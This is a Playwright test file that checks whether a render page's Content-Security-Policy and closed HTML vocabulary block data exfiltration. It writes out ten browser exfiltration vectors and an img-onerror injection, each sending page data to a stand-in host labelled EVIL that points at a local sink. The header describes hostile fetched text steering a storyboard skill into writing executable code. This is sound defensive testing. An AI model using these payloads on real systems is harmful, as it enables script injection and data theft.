/* The render page must not be able to reach the network.
 *
 * Run: node network.test.mjs
 *
 * `custom` is the one beat that executes operator-written JavaScript, and the
 * chain that puts hostile text there is not hypothetical: a fetched source →
 * the corpus → the storyboard skill reads it → it writes a `custom` beat → that
 * beat runs on the operator's machine. Measured before this test existed:
 *
 *     outbound requests from a custom beat: [ 'https://example.com/exfil?x=The%20Brief' ]
 *
 * The request left the browser carrying page data. The oracle here is a real
 * HTTP server on 127.0.0.1 that the vectors are pointed at: a vector escaped if
 * and only if bytes arrived at the sink. Playwright's `request` event is kept
 * alongside it, but only as diagnosis — Chromium reports blocked requests on
 * that event too (a CSP-refused XHR still surfaces there, failing with
 * net::ERR_BLOCKED_BY_CSP), so an assertion on it would have called a working
 * policy a leak. A byte that arrives at a socket is not ambiguous.
 *
 * Three things this file is deliberately shaped to catch:
 *
 *   - It drives the page ITSELF, not through render.mjs. A block implemented in
 *     the runner would leave `scene.html?day=…` opened directly in a browser —
 *     the way an operator scrubs the slider — wide open, and this test would
 *     still see the leak.
 *   - Every vector also draws a line of copy, and the copy is asserted. A policy
 *     strict enough to stop the local scripts loading would stop the leak too,
 *     and would be a broken renderer, not a secure one.
 *   - A blocked attempt has to be VISIBLE. `scene.html` records violations on
 *     `window.__cspViolations` and rethrows them so render.mjs's `pageerror`
 *     collector prints them; silence would mean an exfiltration attempt in a
 *     script.yaml renders green.
 *
 * NOT covered, because CSP does not cover it: top-level navigation
 * (`location.href = 'https://…?data'`, `window.open`). `navigate-to` was removed
 * from the spec and never shipped. See the Task 4 report, section 5.
 */
import { chromium } from 'playwright';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import { readFile, writeFile, rm } from 'node:fs/promises';
import { createServer } from 'node:http';

const HERE = dirname(fileURLToPath(import.meta.url));

/* The sink. Loopback, an ephemeral port, and nothing outside this machine — the
 * point is to catch the page in the act, not to actually exfiltrate. It answers
 * everything, including the WebSocket upgrade, so a vector that gets through
 * gets through completely rather than being stopped by a rude server. */
const hits = [];
const sink = createServer((req, res) => {
  hits.push(req.method + ' ' + req.url);
  res.writeHead(200, { 'content-type': 'application/javascript', 'access-control-allow-origin': '*' });
  res.end('/* */');
});
sink.on('upgrade', (req, socket) => {
  hits.push('UPGRADE ' + req.url);
  socket.destroy();
});
await new Promise((r) => sink.listen(0, '127.0.0.1', r));
const PORT = sink.address().port;
const EVIL = '127.0.0.1:' + PORT;

/* Each vector draws its line first, then fires. `mark` is asserted on screen so
 * a policy that broke the engine cannot pass as a policy that blocked the
 * request. Everything is caught: an unhandled rejection is not the signal under
 * test, and a beat that threw before drawing would fail for the wrong reason. */
const VECTORS = [
  {
    name: 'fetch',
    js: `fetch('http://${EVIL}/x?d=' + document.title).catch(function(){});`,
  },
  {
    name: 'XMLHttpRequest',
    js:
      `var x = new XMLHttpRequest();\n` +
      `x.open('GET', 'http://${EVIL}/x?d=' + document.title);\n` +
      `x.send();`,
  },
  {
    name: 'img src',
    js: `var i = new Image(); i.src = 'http://${EVIL}/x.png?d=' + document.title; document.body.appendChild(i);`,
  },
  {
    name: 'script src',
    js: `var e = document.createElement('script'); e.src = 'http://${EVIL}/x.js'; document.head.appendChild(e);`,
  },
  {
    name: 'iframe',
    js: `var f = document.createElement('iframe'); f.src = 'http://${EVIL}/x?d=' + document.title; document.body.appendChild(f);`,
  },
  {
    name: 'dynamic import()',
    js: `import('http://${EVIL}/x.mjs').catch(function(){});`,
  },
  {
    name: 'navigator.sendBeacon',
    js: `navigator.sendBeacon('http://${EVIL}/x', document.title);`,
  },
  {
    name: 'WebSocket',
    js: `var w = new WebSocket('ws://${EVIL}/x'); w.onerror = function(){};`,
  },
  {
    name: 'link rel=prefetch',
    js: `var l = document.createElement('link'); l.rel = 'prefetch'; l.href = 'http://${EVIL}/x'; document.head.appendChild(l);`,
  },
  {
    name: 'EventSource',
    js: `var s = new EventSource('http://${EVIL}/x'); s.onerror = function(){ s.close(); };`,
  },
];

const HOLD = 3.0;
const planFor = (v, mark) => ({
  episode: '2026-08-16',
  series: 'the-brief',
  series_name: 'The Brief',
  byline: 'Ali Abdukarim',
  format: {
    /* The WHOLE declared context (spec 9). A plan that names only w/h is
       refused by engine.js's format(): half a context would put the wide
       stage under the vertical safe area and say nothing. */
    name: 'vertical', w: 1080, h: 1920,
    safe_top: 400, safe_bottom: 1580, measure: 'narrow', scale: 1,
  },
  fps: 30,
  pace: 1,
  design: {},
  beats: [
    {
      type: 'custom',
      act: '',
      act_label: '',
      hold: HOLD,
      start: 0,
      end: HOLD,
      kicker: '',
      src: '',
      attest: 'fires ' + v.name + ' at a host that must never be reached. — the test',
      js:
        `var __m = E('div', 'body', {text: ${JSON.stringify(mark)}});\n` +
        `fade(__m, .1);\n` +
        `try { ${v.js} } catch (e) { window.__vectorError = String(e); }\n`,
    },
  ],
});

/* .plan.js is how a plan reaches the page — fetch and ES modules are both
 * CORS-blocked over file://. It is a gitignored build artifact; restore whatever
 * was there so running the tests never costs someone a render in progress. */
const PLAN_JS = join(HERE, '.plan.js');
const previousPlan = await readFile(PLAN_JS, 'utf8').catch(() => null);

const browser = await chromium.launch();
let failures = 0;

/* M1/M4 in one line: the policy has to be in the page. A route-blocker in
 * render.mjs would leave every other way of opening scene.html unprotected. */
const html = await readFile(join(HERE, 'scene.html'), 'utf8');
const inPage = /http-equiv=["']Content-Security-Policy["']/i.test(html);
if (!inPage) failures++;
console.log(
  `  ${inPage ? 'ok  ' : 'FAIL'} scene.html carries the policy itself` +
    (inPage ? '' : ' — no <meta http-equiv="Content-Security-Policy"> in the page'),
);

for (const v of VECTORS) {
  const mark = 'vector ' + v.name + ' ran';
  await writeFile(PLAN_JS, 'window.__PLAN = ' + JSON.stringify(planFor(v, mark)) + ';\n', 'utf8');

  const page = await browser.newPage({
    viewport: { width: 1080, height: 1920 },
    deviceScaleFactor: 1,
  });

  hits.length = 0;
  /* Diagnosis, not the verdict. `local` is how the page's own scripts are seen
   * loading — engine.js, planbuild.js, .plan.js — and `attempted` records what
   * Chromium was asked for, with the reason it did not happen. */
  const local = [];
  const attempted = [];
  const reasons = [];
  const errors = [];
  page.on('request', (r) => (r.url().startsWith('file:') ? local : attempted).push(r.url()));
  page.on('requestfailed', (r) => {
    if (!r.url().startsWith('file:')) reasons.push(r.url() + ' → ' + (r.failure()?.errorText || '?'));
  });
  page.on('pageerror', (e) => errors.push(String(e)));

  await page.goto('file://' + join(HERE, 'scene.html') + '?plan=1');
  await page.evaluate(() => document.body.classList.add('render'));
  await page.evaluate(() => document.fonts.ready);
  /* Guarded, because a policy strict enough to stop engine.js loading leaves no
   * __seek to call, and that has to be REPORTED as a broken renderer rather
   * than thrown as a stack trace halfway down the vector list. */
  const seekable = await page.evaluate(() => typeof window.__seek === 'function');
  if (seekable) await page.evaluate((t) => window.__seek(t), HOLD * 0.72);
  /* Give anything asynchronous — a prefetch, a beacon, a WebSocket handshake —
   * the chance to be wrong. A test that measured too early would pass on a
   * missing policy. */
  await page.waitForTimeout(400);

  const clean = hits.length === 0;
  if (!clean) failures++;
  console.log(
    `  ${clean ? 'ok  ' : 'FAIL'} ${v.name.padEnd(20)} nothing reached the sink` +
      (clean
        ? attempted.length
          ? ` (asked for it; ${reasons.join(', ') || 'never sent'})`
          : ' (never even asked)'
        : ` — RECEIVED ${JSON.stringify(hits)}`),
  );

  /* M3: the engine still works. The beat drew its line, and the local scripts
   * that let it draw were loaded. */
  const shown = await page.evaluate(() => document.getElementById('scenes').innerText);
  const drew = seekable && shown.replace(/\s+/g, ' ').includes(mark);
  const loaded = ['engine.js', 'planbuild.js', '.plan.js'].filter(
    (f) => !local.some((u) => u.endsWith(f)),
  );
  if (!drew || loaded.length) failures++;
  console.log(
    `  ${drew && !loaded.length ? 'ok  ' : 'FAIL'} ${v.name.padEnd(20)} the page still renders` +
      (drew ? '' : ' — the beat drew nothing') +
      (loaded.length ? ` — never loaded ${JSON.stringify(loaded)}` : ''),
  );

  /* M5/R3: refused, and said so. A violation the operator never sees is a
   * render that goes green with an exfiltration attempt inside it. */
  const violations = await page.evaluate(() => window.__cspViolations || []);
  const said = violations.length > 0;
  const surfaced = errors.some((e) => /Content-Security-Policy/i.test(e));
  if (!said || !surfaced) failures++;
  console.log(
    `  ${said && surfaced ? 'ok  ' : 'FAIL'} ${v.name.padEnd(20)} the refusal is visible` +
      (said ? '' : ' — window.__cspViolations is empty') +
      (surfaced ? '' : ' — nothing reached pageerror'),
  );

  await page.close();
}

/* ============ the same question, asked of a beat that is not `custom` ============
 *
 * Every vector above is a `custom` beat, and that is exactly why this surface
 * stayed invisible to this file: `jumpChart.rows[].shown` is set as `html`, and
 * innerHTML grants attributes as well as tags. An inline event handler on a
 * plain data field executes with the page's globals, needs no `attest`, is seen
 * by no determinism lint, and until Task 5 appeared on no review screen.
 *
 * The sink is the oracle here too, and the vector is `location.href` rather than
 * `fetch` on purpose: D-090 records that CSP cannot stop a top-level navigation,
 * so a policy is not what makes this one fail. Only the closed vocabulary is. */
{
  const HOLD_J = 3.0;
  const ROW = (shown) => ({ label: 'FrontierCode 1.1', before: 34.4, after: 43.6, shown });
  const chartPlan = (shown) => ({
    episode: '2026-08-16',
    series: 'the-brief',
    series_name: 'The Brief',
    byline: 'Ali Abdukarim',
    format: {
    /* The WHOLE declared context (spec 9). A plan that names only w/h is
       refused by engine.js's format(): half a context would put the wide
       stage under the vertical safe area and say nothing. */
    name: 'vertical', w: 1080, h: 1920,
    safe_top: 400, safe_bottom: 1580, measure: 'narrow', scale: 1,
  },
    fps: 30,
    pace: 1,
    design: {},
    beats: [
      {
        type: 'jumpChart',
        act: '',
        act_label: '',
        hold: HOLD_J,
        start: 0,
        end: HOLD_J,
        kicker: '',
        src: 'deepmind',
        quote: 'FrontierCode 1.1 rises from 34.4 to 43.6',
        rows: [ROW('<s>34.4</s> &rarr; 43.6'), ROW(shown)],
        scale: 70,
        footnote: 'Scores as published by Google, on a common 0–70% scale.',
      },
    ],
  });

  const openWith = async (shown) => {
    await writeFile(PLAN_JS, 'window.__PLAN = ' + JSON.stringify(chartPlan(shown)) + ';\n', 'utf8');
    const page = await browser.newPage({
      viewport: { width: 1080, height: 1920 },
      deviceScaleFactor: 1,
    });
    await page.goto('file://' + join(HERE, 'scene.html') + '?plan=1');
    /* Guarded the way the loop above is, and for a sharper reason here: this
     * vector NAVIGATES. On the failing side the document is replaced before a
     * single line of this can run, and a thrown "window.__seek is not a
     * function" halfway down the file is a crash report rather than a verdict. */
    if (await page.evaluate(() => typeof window.__seek === 'function')) {
      await page.evaluate(() => document.body.classList.add('render'));
      await page.evaluate(() => document.fonts.ready);
      await page.evaluate((t) => window.__seek(t), HOLD_J * 0.72);
    }
    await page.waitForTimeout(400);
    return page;
  };

  hits.length = 0;
  let page = await openWith(
    `<img src=x onerror="location.href='http://${EVIL}/shown?d='+encodeURIComponent(document.title)">`,
  );
  const quiet = hits.length === 0;
  if (!quiet) failures++;
  console.log(
    `  ${quiet ? 'ok  ' : 'FAIL'} ${'shown (jumpChart)'.padEnd(20)} nothing reached the sink` +
      (quiet ? ' (never even asked)' : ` — RECEIVED ${JSON.stringify(hits)}`),
  );
  await page.close();

  /* Execution, separately from the network, because they are separate
   * properties and D-089 is explicit that a CSP closes only one of them. */
  page = await openWith('<img src=x onerror="window.__PWNED=1">');
  const inert = await page.evaluate(() => ({
    pwned: window.__PWNED === undefined,
    imgs: document.querySelectorAll('#scenes img').length,
    /* the negative half: the vocabulary is closed, not removed. The committed
     * episode's row must still strike its old score through. */
    struck: document.querySelectorAll('#scenes .jval s').length,
    text: (document.getElementById('scenes') || document.body).innerText.replace(/\s+/g, ' '),
  }));
  const ok =
    inert.pwned && inert.imgs === 0 && inert.struck === 1 && inert.text.includes('onerror');
  if (!ok) failures++;
  console.log(
    `  ${ok ? 'ok  ' : 'FAIL'} ${'shown (jumpChart)'.padEnd(20)} the handler is text, not code` +
      (inert.pwned ? '' : ' — window.__PWNED is set') +
      (inert.imgs ? ` — ${inert.imgs} live <img> on the stage` : '') +
      (inert.struck === 1 ? '' : ` — ${inert.struck} <s> elements, expected 1`) +
      (inert.text.includes('onerror') ? '' : ' — the escaped handler is not on the frame'),
  );
  await page.close();
}

await browser.close();
sink.closeAllConnections?.();
await new Promise((r) => sink.close(r));
if (previousPlan === null) await rm(PLAN_JS, { force: true });
else await writeFile(PLAN_JS, previousPlan, 'utf8');
console.log(failures ? `${failures} FAILURES` : 'no request escapes the page');
process.exit(failures ? 1 : 0);
